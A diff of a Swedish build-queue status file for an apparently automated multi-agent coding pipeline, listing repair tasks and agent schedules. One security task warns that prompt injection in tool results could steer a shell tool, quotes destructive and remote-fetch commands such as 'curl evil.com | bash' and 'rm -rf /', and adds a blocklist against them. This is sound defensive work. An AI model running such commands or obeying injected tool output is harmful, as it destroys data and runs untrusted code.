@@ -1,9 +1,71 @@
 {
-  "generated_at": "2026-06-10T21:33:04",
+  "generated_at": "2026-06-10T22:05:55",
   "source": "lokal",
   "queue": {
-    "byggs": [],
-    "ko": [],
+    "byggs": [
+      {
+        "id": "d64f3a3d-9df9-47e8-b031-308cdb3b9639",
+        "title": "app.py trunkerad rad 5252 — SyntaxError",
+        "spec_markdown": "**Källa:** loggagent-auto\n\nCODEBASE_AUDIT + AGENT_NOTISER rapporterar att app.py är avskuren på rad 5252. `if __name__ == '__main__'`-blocket är ofullständigt och Python kastar SyntaxError. Servern kan inte starta. Åtgärd: Hitta och återställ det saknade slutet av app.py (troligen ~10-50 rader).",
+        "status": "byggs",
+        "created_at": "2026-06-10T21:58:31.954704",
+        "priority": "high",
+        "sent_at": "2026-06-10T22:02:18.353557"
+      }
+    ],
+    "ko": [
+      {
+        "id": "bcd17ff6-d1b3-483d-8315-d824d8b97581",
+        "title": "DB: Saknar fsync + atomisk write (DB-01, DB-NEW-1)",
+        "spec_markdown": "**Källa:** loggagent-auto\n\nAGENT_DB_STATUS rapporterar 🔴 KRITISK: 20+ skrivfunktioner saknar fsync, och chat-verktygens file_write/file_edit skriver utan lås och utan atomisk write. Risk för datakorrumpering vid krasch. Åtgärd: Lägg till tmp-fil + os.replace() + fsync på alla kritiska skrivoperationer.",
+        "status": "kö",
+        "created_at": "2026-06-10T21:58:31.954729",
+        "priority": "high"
+      },
+      {
+        "id": "44b75ed5-d8bd-4054-95f3-8996f92c6edc",
+        "title": "sessions.json korrupt (DB-03)",
+        "spec_markdown": "**Källa:** loggagent-auto\n\nAGENT_DB_STATUS: sessions.json har JSON-fel vid char ~395 000. Alla aktiva sessioner kan vara otillgängliga. Åtgärd: Kör reparationsskript för att isolera och ta bort korrupt post, verifiera att inga aktiva sessioner förloras.",
+        "status": "kö",
+        "created_at": "2026-06-10T21:58:31.954741",
+        "priority": "high"
+      },
+      {
+        "id": "d2dd2a4e-3b6b-4257-aa86-1641fb90fbd9",
+        "project_id": "main",
+        "title": "DRY-REFACTOR: Dela upp delete_session() — 861-raders monolith",
+        "spec_markdown": "## CONTEXT\ndelete_session() i app.py är ~861 rader lång (rad 1238–2098, ~17% av hela backend-koden).\nFunktionen hanterar lokal fil-cleanup, Supabase-radering och GitHub-radering allt i ett block.\nCODEBASE_AUDIT (2026-06-10) flaggade detta som HÖG prioritet: omöjlig att testa isolerat,\ngaranterar framtida buggar. Inga andra tasks i kön täcker detta.\n\n## TASK\nDela upp delete_session() i fyra separata hjälpfunktioner:\n1. _delete_local_files(session_id) — tar bort lokala sessionsfiler + byggresultat\n2. _delete_supabase_session(session_id) — raderar session + relaterade rader i Supabase\n3. _delete_github_session(session_id, settings) — tar bort från GitHub om self_repo är satt\n4. _cleanup_temp_files(session_id) — städar build_results/, interim_result*.json m.m.\n\ndelete_session() ska anropa de fyra funktionerna i sekvens och samla eventuella fel i en lista.\nVarje hjälpfunktion ska ha eget try/except och logga fel utan att stoppa övriga steg.\n\nSöktermer för att hitta rätt plats: search_file(pattern='def delete_session', path='app.py')\n\n## ACCEPTANCE CRITERIA\n- [ ] delete_session() är ≤ 60 rader efter refaktorering\n- [ ] Alla fyra hjälpfunktioner är <= 250 rader vardera\n- [ ] Beteendet är identiskt med befintlig implementation — inga nya features\n- [ ] index.html behöver INTE ändras\n- [ ] Verifiera med search_file att delete_session() INTE refererar till Supabase eller GitHub direkt längre",
+        "spec_bestallare": "CODEBASE_AUDIT 2026-06-10 — HÖG prioritet",
+        "status": "kö",
+        "created_at": "2026-06-10T22:00:50",
+        "updated_at": "2026-06-10T22:00:50",
+        "position": 10023
+      },
+      {
+        "id": "874fab72-3e99-4865-90bf-5865652fa147",
+        "title": "app.py trunkerad — SyntaxError rad 5252",
+        "spec_markdown": "**Källa:** loggagent-auto\n\nGRANSKARE_LOG och CODEBASE_AUDIT rapporterar att app.py är avskuren på rad 5252. `if __name__ == '__main__'` blocket är ofullständigt. SyntaxError verifierat. Appen kan inte starta. Kräver omedelbar fix.",
+        "status": "kö",
+        "created_at": "2026-06-10T22:02:33.217410",
+        "priority": "high"
+      },
+      {
+        "id": "6135a298-8f24-4003-9b68-ba2655d93d76",
+        "title": "DB: sessions.json korrupt + saknar fsync/atomisk write",
+        "spec_markdown": "**Källa:** loggagent-auto\n\nAGENT_DB_STATUS rapporterar: (1) sessions.json är korrupt med JSON-fel vid ca char 395xxx, (2) 20+ skrivfunktioner saknar fsync, (3) CRLF-endings på Windows (newline='' saknas), (4) chat-verktyg file_write/file_edit skriver utan lås och utan atomisk write. Alla klassade KRITISK.",
+        "status": "kö",
+        "created_at": "2026-06-10T22:02:33.217439",
+        "priority": "high"
+      },
+      {
+        "id": "b3b7e138-7c17-4608-af9a-5fb4b4edd53c",
+        "title": "Chatt: rå JS-felmeddelanden visas för användaren",
+        "spec_markdown": "**Källa:** loggagent-auto\n\nAGENT_KID_STATUS: Vid nätverksfel ser användaren rå feltext som `Fel: Failed to fetch` eller `Fel: NetworkError`. Bör ersättas med vänligt meddelande. Enkel 2-raders fix med hög KID-impact.",
+        "status": "kö",
+        "created_at": "2026-06-10T22:02:33.217457",
+        "priority": "high"
+      }
+    ],
     "klar": [
       {
         "id": "6831b647-f676-4b6c-af34-28aa651f1f3e",
@@ -3058,6 +3120,104 @@
           "success": true,
           "files_changed": [],
           "summary": "Alla alert(), confirm() och prompt()-anrop är redan ersatta i index.html — inga ändringar behövdes."
+        },
+        "last_verdict": {
+          "approved": true,
+          "approved_at": "2026-06-10T21:44:51"
+        },
+        "updated_at": "2026-06-10T21:44:51"
+      },
+      {
+        "id": "eac32328-ca6c-4702-bee9-f8e689a48436",
+        "project_id": "main",
+        "title": "CHATBOX-POLISH: run_id recovery + project_context vid /send + .gitignore",
+        "spec_markdown": "## CONTEXT\nTre kvarstående items fran AGENT_CHATBOX_BUILD (iterationerna 4-5):\n- D2: SSE-endpointen skickar inte run_id till frontend vid granskning, webbläsaren kan inte aterhämta resultat vid reconnect\n- AM: build_project_context beräknas vid /send men sparas aldrig pa queue-itemet, SSE-endpointen maste ta emot profil via URL-param (säkerhetsproblem S1 kvarstår)\n- G5: .gitignore saknar rader for interna filer\n\n## TASK\n\n### 1. run_id recovery-event i SSE (D2)\nI /api/builder/stream/{item_id} (app.py), i Step E (efter att /review-anropet startat):\n\n    review_data = await build_queue_review(item_id, review_payload)\n    run_id = review_data.get(\"run_id\") or review_data.get(\"id\", \"\")\n    if run_id:\n        yield _sse({\"type\": \"review_started\",\n                    \"run_id\": run_id,\n                    \"recovery_url\": f\"/api/review/result/{run_id}\",\n                    \"text\": \"Granskning startad...\"})\n\nI frontend handleBuilderEvent() (index.html), lagg till case:\n\n    } else if (msg.type === 'review_started') {\n        sessionStorage.setItem('builder_recovery_' + currentItemId, JSON.stringify({\n            run_id: msg.run_id, url: msg.recovery_url, ts: Date.now()\n        }));\n    }\n\nI loadAttBygga(): om sessionStorage har en builder_recovery_<id>-nyckel for ett byggs-item och ts ar äldre an 30s, visa en \"Visa granskningsresultat\"-knapp som hamtar recovery_url.\n\n### 2. Spara project_context vid /send (AM)\nI send_build_queue_item() (app.py), efter att job-objektet ar byggt och innan _queue_write:\n\n    item[\"project_context\"] = job.get(\"project_context\", \"\")\n    _queue_write(items)\n\nI SSE-endpointen builder_stream(): ersatt build_project_context(profile_dict) med item.get(\"project_context\", build_project_context({})).\n\n### 3. Komplettera .gitignore (G5)\nKontrollera om dessa rader redan finns i .gitignore (sok pa varje rad innan du lagger till):\n- projects.json\n- intrim_result_concrete.json\n- test_intrim.py\n- ARKITEKTUR_ANALYS.md\n- KID_USER_PROMPT.md\n- AGENT_CHATBOX_BUILD.md\nLagg bara till de som saknas. Kontrollera att filen slutar med newline.\n\n## ACCEPTANCE CRITERIA\n- [ ] SSE-endpoint skickar review_started-event med run_id och recovery_url\n- [ ] Frontend sparar recovery-data i sessionStorage och visar aterhämtningsknapp\n- [ ] send_build_queue_item sparar project_context pa queue-itemet\n- [ ] SSE-endpointen laser project_context fran itemet (ej via URL-param)\n- [ ] .gitignore innehaller alla listade rader utan dubbletter\n",
+        "spec_bestallare": "AGENT_CHATBOX_BUILD iteration 4-5 D2 AM G5",
+        "status": "klar",
+        "position": 10021,
+        "created_at": "2026-06-10T21:27:47",
+        "result_summary": {
+          "success": true,
+          "files_changed": [
+            "app.py",
+            "index.html",
+            ".gitignore"
+          ],
+          "summary": "D2: Step E i builder_stream emittar review_started-event; handleBuilderEvent + fetchBuilderRecovery i frontend; recovery-knapp i renderQueueBox. AM: redan implementerat. G5: .gitignore kompleterad med 5 saknade rader."
+        },
+        "last_verdict": {
+          "approved": true,
+          "approved_at": "2026-06-10T21:44:51"
+        },
+        "updated_at": "2026-06-10T21:44:51"
+      },
+      {
+        "id": "ce3939f9-e77c-4599-9f7a-627bba53875c",
+        "title": "KID-SPRINT1: Barnvänliga felmeddelanden + verktygsnamn + git-rubrik i chat",
+        "spec_markdown": "**Källa:** flode-agent-auto\n**Typ:** Pipeline-flöde / Återkö\n\nDenna task förlorades när build_queue.json trunkerades under en skrivning (2026-06-10T21:45).\n\n### KID-1 — Generiska felmeddelanden i chatSend() och chatApprove()\nFil: index.html, catch-block i chatSend() och chatApprove()\n\nSök på: `assistantBubble.textContent = 'Fel: '`\nByt ut alla förekomster från:\n  assistantBubble.textContent = 'Fel: ' + e.message;\ntill:\n  assistantBubble.textContent = 'Något gick fel. Försök igen.';\n\n### Varför\nPrimär användare (10-åring) ska inte se teknisk jargong och råa felmeddelanden.",
+        "status": "klar",
+        "created_at": "2026-06-10T21:47:49.724163",
+        "result_summary": {
+          "success": true,
+          "files_changed": [],
+          "summary": "KID-1 redan implementerad — chatSend() och chatApprove() använder redan barnvänliga felmeddelanden (rad 2241 och 2286). Inga ändringar behövdes."
+        }
+      },
+      {
+        "id": "257b24ef-e222-4b0d-8cd4-f23a4aea08af",
+        "title": "INFRA-KRITISK: build_queue.json trunkerades vid skrivning — lägg till atomic-write-skydd",
+        "spec_markdown": "**Källa:** flode-agent-auto\n**Typ:** Pipeline-flöde / Återkö\n\nbuild_queue.json var avtrunkerad (271 326 tecken, sista objektet kapades mitt i en sträng).\nOrsakades troligen av ett interrupt under filskrivning.\n\n### Åtgärd\nVerifiera att alla ställen som skriver build_queue.json använder atomic write-mönster:\n  1. Skriv till build_queue.json.tmp\n  2. os.replace(tmp, path)\n\nKontrollera: app.py, alla ställen som modifierar build_queue (advance_build_queue, update_queue_item, etc.)\nLägg även till _repair_truncated_json-anrop vid uppstart (om P3-M inte redan är merged).",
+        "status": "klar",
+        "created_at": "2026-06-10T21:47:49.724209",
+        "updated_at": "2026-06-10T21:55:43",
+        "log": [
+          {
+            "at": "2026-06-10T21:55:43",
+            "event": "byggd",
+            "detail": "atomic-write verifierat, _repair_truncated_queue tillagd, app.py återställd från .bak"
+          }
+        ],
+        "result_summary": {
+          "success": true,
+          "files_changed": [
+            "app.py"
+          ],
+          "summary": "Atomic write redan på plats. Lade till _repair_truncated_queue() + repair-logik i _queue_load(). Återställde trunkerad app.py från .bak med Supabase-integration bevarad."
+        }
+      },
+      {
+        "id": "b6924c190275",
+        "project_id": "main",
+        "title": "APP-TRUNKERING-5252: Fixa avhuggen rad i app.py — server kan inte omstartas",
+        "status": "klar",
+        "created_at": "2026-06-10T21:48:54",
+        "position": 10022,
+        "spec_markdown": "## CONTEXT\n\nCODEBASE_AUDIT.md flaggar att `app.py` är avskuren på rad 5252 med en avhuggen sträng:\n```\nhost = \"0.0.0.0\" if os.environ.ge\n```\n`if __name__ == \"__main__\"`-blocket är ofullständigt. Python kan inte kompilera filen.\nServern körs för tillfället (Railway hot-reload), men ny deploy eller manuell restart misslyckas direkt med SyntaxError.\n\n## TASK\n\n1. Sök i `app.py` efter `os.environ.ge` (nära slutet av filen — ska finnas runt rad 5250).\n2. Komplettera raden och avsluta `if __name__ == \"__main__\"`-blocket korrekt:\n\n```python\nhost = \"0.0.0.0\" if os.environ.get(\"RAILWAY_ENVIRONMENT\") else \"127.0.0.1\"\nport = int(os.environ.get(\"PORT\", 8001))\nuvicorn.run(app, host=host, port=port, reload=False)\n```\n\n3. Kör `python -m py_compile app.py` och verifiera att inga syntaxfel finns.\n\n## ACCEPTANCE CRITERIA\n\n- [ ] `python -m py_compile app.py` returnerar exit code 0\n- [ ] `if __name__ == \"__main__\"` blocket avslutas korrekt med `uvicorn.run(...)`\n- [ ] `reload=False` (aldrig `reload=True`) i uvicorn.run\n- [ ] `host` bestäms av env-variabeln `RAILWAY_ENVIRONMENT`\n",
+        "spec_bestallare": "CODEBASE_AUDIT.md — app.py avskuren rad 5252, KRITISK",
+        "result_summary": {
+          "success": true,
+          "files_changed": [
+            "app.py"
+          ],
+          "summary": "Removed 9 trailing null bytes from app.py, changed uvicorn.run to use app object directly and reload=False. File compiles cleanly."
+        },
+        "completed_at": "2026-06-10T21:58:44.911000"
+      },
+      {
+        "id": "1420e11b-fcb9-4509-aca4-49532fc2d3c5",
+        "project_id": "main",
+        "title": "SEC-BASHEXEC: bash_exec saknar blocklista för farliga kommandon",
+        "status": "klar",
+        "created_at": "2026-06-10T21:52:50",
+        "spec_markdown": "## CONTEXT\nCODEBASE_AUDIT identifierade att `bash_exec`-verktyget (app.py ~rad 189) kör godtyckliga shell-kommandon via `shell=True` utan begränsningar. Kommandosträngen kommer direkt från Claude API-svar och kan manipuleras via prompt injection i tool-resultat.\n\nNuläge (ungefärlig kod):\n```python\nresult = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, cwd=cwd)\n```\nUtan blocklista kan agenten köra: `rm -rf /`, `curl evil.com | bash`, `del /s /q C:\\*`, etc.\n\n## TASK\nLägg till en blocklista i `bash_exec`-hanteringen i app.py (~rad 189). Sök med `search_file(pattern=\"bash_exec\")` för att hitta exakt plats.\n\n**Blocklista:**\n```python\n_BASH_BLACKLIST = (\n    \"rm -rf\", \"rm -r /\", \"del /s\", \"del /q\", \"format \",\n    \"shutdown\", \"reboot\", \"taskkill\", \"kill -9\",\n    \"curl \", \"wget \", \"Invoke-WebRequest\",   # inga externa nätverksanrop\n    \"> /dev/sda\", \"dd if=\", \"mkfs\",\n    \":(){:|:&};:\",  # fork bomb\n    \"python app.py\", \"uvicorn\",              # starta inte om servern\n    \"npm install\", \"pip install\",            # inga paketinstallationer\n)\n\ndef _check_bash_safe(cmd: str) -> str | None:\n    \"\"\"Returnerar felmeddelande om kommandot är farligt, annars None.\"\"\"\n    lower = cmd.strip().lower()\n    for blocked in _BASH_BLACKLIST:\n        if blocked.lower() in lower:\n            return f\"[BLOCKERAT] Kommandot innehåller '{blocked}' — ej tillåtet av säkerhetsskäl.\"\n    return None\n```\n\nI `bash_exec`-hanteringen, lägg till check INNAN subprocess.run:\n```python\nerr = _check_bash_safe(command)\nif err:\n    return err  # eller return {\"output\": err, \"exit_code\": 1}\n```\n\n## ACCEPTANCE CRITERIA\n- [ ] `bash_exec` med `rm -rf /` blockeras och returnerar ett tydligt felmeddelande\n- [ ] `bash_exec` med `curl evil.com` blockeras\n- [ ] `bash_exec` med `git status` och `git diff` fungerar fortfarande\n- [ ] Befintlig timeout (30s) och cwd-hantering påverkas inte\n- [ ] Blocklistan är definierad som konstant på modulnivå (inte inline)\n",
+        "spec_bestallare": "CODEBASE_AUDIT (HÖG säkerhetsprioritering) — bash_exec saknar begränsningar",
+        "position": 67,
+        "result_summary": {
+          "success": true,
+          "files_changed": [
+            "app.py"
+          ],
+          "summary": "Lade till _BASH_BLACKLIST konstant och _check_bash_safe() funktion på modulnivå. bash_exec blockerar nu farliga kommandon (rm -rf, curl, del /s, m.fl.) och returnerar tydligt felmeddelande."
         }
       }
     ],
@@ -3069,91 +3229,91 @@
     "detail": ""
   },
   "git": {
-    "hash": "413f1ee64a35932b1012742aee1626b721fdf4ba",
-    "message": "auto: AGENT-FIX-2: review_started_at + AGENT-FIX-3: Shell injection i + DRY-SPRINT4: R6 (git-identitet"
+    "hash": "fc1e12dffa0e46d5c1412bbbf004a49a480bda37",
+    "message": "auto: granskningsresultat + godkänn items i build_queue"
   },
   "agents": [
     {
       "taskId": "snickare-auto-bygg",
       "name": "Snickare",
-      "lastRunAt": "2026-06-10T21:32:09.273Z",
+      "lastRunAt": "2026-06-10T22:02:09.594Z",
       "schedule": "Every minute, every hour, every day",
       "enabled": true
     },
     {
       "taskId": "projektledare-auto",
       "name": "Projektledare",
-      "lastRunAt": "2026-06-10T21:31:09.193Z",
+      "lastRunAt": "2026-06-10T22:04:09.416Z",
       "schedule": "Every 3 minutes, every hour, every day",
       "enabled": true
     },
     {
       "taskId": "granskare-auto",
       "name": "Granskare",
-      "lastRunAt": "2026-06-10T21:32:09.443Z",
+      "lastRunAt": "2026-06-10T22:03:17.389Z",
       "schedule": "Every 3 minutes, every hour, every day",
       "enabled": true
     },
     {
       "taskId": "specskrivare-auto",
       "name": "Specskrivare",
-      "lastRunAt": "2026-06-10T21:23:09.326Z",
+      "lastRunAt": "2026-06-10T22:01:09.285Z",
       "schedule": "Every 10 minutes, every hour, every day",
       "enabled": true
     },
     {
       "taskId": "loggagent-auto",
       "name": "Loggagent",
-      "lastRunAt": "2026-06-10T21:19:32.008Z",
+      "lastRunAt": "2026-06-10T22:02:09.925Z",
       "schedule": "Every 15 minutes, every hour, every day",
       "enabled": true
     },
     {
       "taskId": "styrare-auto",
       "name": "Styrare",
-      "lastRunAt": "2026-06-10T21:19:43.207Z",
+      "lastRunAt": "2026-06-10T22:04:09.579Z",
       "schedule": "Every 10 minutes, every hour, every day",
       "enabled": true
     },
     {
       "taskId": "ux-agent-auto",
       "name": "UX-agent",
-      "lastRunAt": "2026-06-10T20:07:08.955Z",
-      "schedule": "At 0 minutes past the hour, every 2 hours, every day",
+      "lastRunAt": "2026-06-10T22:05:09.526Z",
+      "schedule": "Every 2 hours, every day",
       "enabled": true
     },
     {
       "taskId": "kid-agent-auto",
       "name": "KID-agent",
       "lastRunAt": "2026-06-10T21:25:20.321Z",
-      "schedule": "At 20 minutes past the hour, every 2 hours, every day",
+      "schedule": "Every 2 hours, every day",
       "enabled": true
     },
     {
       "taskId": "flode-agent-auto",
       "name": "Flödesagent",
-      "lastRunAt": "2026-06-10T21:32:42.932Z",
-      "schedule": "At 40 minutes past the hour, every 2 hours, every day",
+      "lastRunAt": "2026-06-10T22:05:54.994Z",
+      "schedule": "Every 2 hours, every day",
       "enabled": true
     },
     {
       "taskId": "db-agent-auto",
       "name": "DB-agent",
       "lastRunAt": "2026-06-10T18:58:49.352Z",
-      "schedule": "At 01:18 AM, every day",
+      "schedule": "Every 2 hours, every day",
       "enabled": true
     },
     {
       "taskId": "kodarkitekt-auto",
       "name": "Kodarkitekt",
       "lastRunAt": "2026-06-10T21:27:53.684Z",
-      "schedule": "At 01:36 AM, every day",
+      "schedule": "Every 2 hours, every day",
       "enabled": true
     },
     {
       "taskId": "sanitetsvakt-auto",
       "name": "Sanitetsvakt",
-      "lastRunAt": "2026-06-10T21:21:44.955Z",
+      "lastRunAt": "2026-06-10T22:05:36.431Z",
       "schedule": "Every minute, every hour, every day",
       "enabled": true
     },
@@ -3167,7 +3327,7 @@
     {
       "taskId": "dashboard-agent-auto",
       "name": "Dashboard",
-      "lastRunAt": "2026-06-10T21:32:53.210Z",
+      "lastRunAt": "2026-06-10T22:05:45.228Z",
       "schedule": "Every minute, every hour, every day",
       "enabled": true
     },
